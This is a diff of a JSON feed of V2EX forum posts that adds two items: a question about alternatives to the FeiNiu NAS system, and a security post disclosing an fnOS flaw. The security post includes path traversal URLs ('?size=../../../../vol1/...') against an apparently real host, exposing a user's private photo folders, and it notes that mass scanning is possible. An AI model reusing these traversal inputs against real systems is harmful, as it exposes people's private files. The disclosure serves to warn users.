@@ -17,6 +17,22 @@
   "description": "way to explore",
   "items": [
     {
+      "id": "tag:www.v2ex.com,2026-01-31:/t/1189811",
+      "url": "https://www.v2ex.com/t/1189811#reply0",
+      "title": "[问与答] 飞牛信任崩塌，有什么替代品？",
+      "content_html": "<p>飞牛最大优势就是易用</p>",
+      "content_text": "飞牛最大优势就是易用",
+      "date_published": "2026-01-31T16:26:46.000Z"
+    },
+    {
+      "id": "tag:www.v2ex.com,2026-01-31:/t/1189809",
+      "url": "https://www.v2ex.com/t/1189809#reply6",
+      "title": "[信息安全] 飞牛 OS 漏洞会导致 nas 上所有文件泄露",
+      "content_html": "<p>涉密的数据永远不要联网，很早以前我发过一个帖子： <a href=\"https://www.v2ex.com/t/1106691\" rel=\"nofollow\">https://www.v2ex.com/t/1106691</a></p>\n<p>这次飞牛漏洞可以通过浏览器访问任意文件。例子：</p>\n<p>文件访问： <a href=\"https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/DCIM/2023/10/Screenshot_2023-10-30-19-30-37-516_com.tencent.mm.jpg\" rel=\"nofollow\">https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/DCIM/2023/10/Screenshot_2023-10-30-19-30-37-516_com.tencent.mm.jpg</a></p>\n<p>目录访问： <a href=\"https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/\" rel=\"nofollow\">https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/</a></p>\n<p>而且 fnos id 连接不受速度限制，也不需要验证码，攻击者可以脚本批量扫描获取大量用户文件。</p>",
+      "content_text": "涉密的数据永远不要联网，很早以前我发过一个帖子： https://www.v2ex.com/t/1106691\n这次飞牛漏洞可以通过浏览器访问任意文件。例子：\n文件访问： https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/DCIM/2023/10/Screenshot_2023-10-30-19-30-37-516_com.tencent.mm.jpg\n目录访问： https://nasnas1.5ddd.com/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol1/1001/Photos/MobileBackup/Xiaomi%20MI%20CC%209/\n而且 fnos id 连接不受速度限制，也不需要验证码，攻击者可以脚本批量扫描获取大量用户文件。",
+      "date_published": "2026-01-31T16:00:45.000Z"
+    },
+    {
       "id": "tag:www.v2ex.com,2026-01-31:/t/1189808",
       "url": "https://www.v2ex.com/t/1189808#reply0",
       "title": "[职场话题] 某东就是这样招人的吗？",
